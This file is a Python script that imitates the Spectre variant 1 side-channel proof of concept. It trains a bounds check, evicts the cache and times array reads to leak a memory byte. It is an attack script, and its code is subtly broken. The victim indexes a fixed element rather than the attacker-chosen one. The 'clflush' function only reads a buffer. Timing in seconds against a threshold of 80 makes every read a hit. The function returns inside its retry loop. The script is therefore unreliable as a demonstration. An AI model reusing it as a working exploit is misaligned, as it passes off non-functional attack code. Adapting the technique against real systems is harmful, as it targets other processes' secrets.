import time

array1_size = 16
array1 = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]
array2 = [None]*256*512
temp = 0

def victim_function(x):
    if (x < array1_size):
        temp = array2[array1[1] * 512]



# Flush+Reload
CACHE_HIT_THRESHOLD = 80
CACHE_SIZE = 12 * 1024 * 1024
eviction_buffer = [42]*CACHE_SIZE

def clflush(size, offset=64):
    temp = 0
    # Fill our CPU cache
    for i in range(0, size, offset):
        temp = eviction_buffer[i]
        


def read_memory_byte(malicious_x):
    results = [0]*256

    for tries in range(999, 0, -1):
        training_x = tries % array1_size
        clflush(CACHE_SIZE)

        for j in range(33):
            for z in range(100):
                pass # delay
            # if j % 4 training_x else malicious_x
            x = ((j % 4) - 1) & ~0xFFFF
            x = (x | (x >> 16))
            x = training_x ^ (x & (malicious_x ^ training_x))
            victim_function(x)
        
        for i in range(256):
            mix_i = ((i * 167) + 13) & 255;
            time1 = time.time()
            junk = array2[mix_i * 512]
            time2 = time.time() - time1
            if (time2 <= CACHE_HIT_THRESHOLD):
                results[mix_i] += 1

        j = k = -1
        for i in range(256):
            if j < 0 or results[i] >= results[j]:
                k = j
                j = i
            elif k < 0 or results[i] >= results[k]:
                k = i

        if results[j] >= (2 * results[k] + 5) or (results[j] == 2 and results[k] == 0):
            break


        value = [0, 0]
        score = [0, 0]
        value[0] = j
        value[1] = k
        score[0] = results[j]
        score[1] = results[k]

        return value, score


if __name__ == "__main__":
    malicious_x = 42
    l= 40

    for _ in range(l, 0, -1):
        value, score = read_memory_byte(malicious_x)
        print("Success" if score[0] >= 2*score[1] else "Unclear")
        print(value[0], (chr(value[0]) if value[0] > 31 and value[0] < 127 else '?'), score[0])

        if (score[1] > 0):
            print("(second best:", value[1], "score:", score[1], ")")



clflush(CACHE_SIZE)
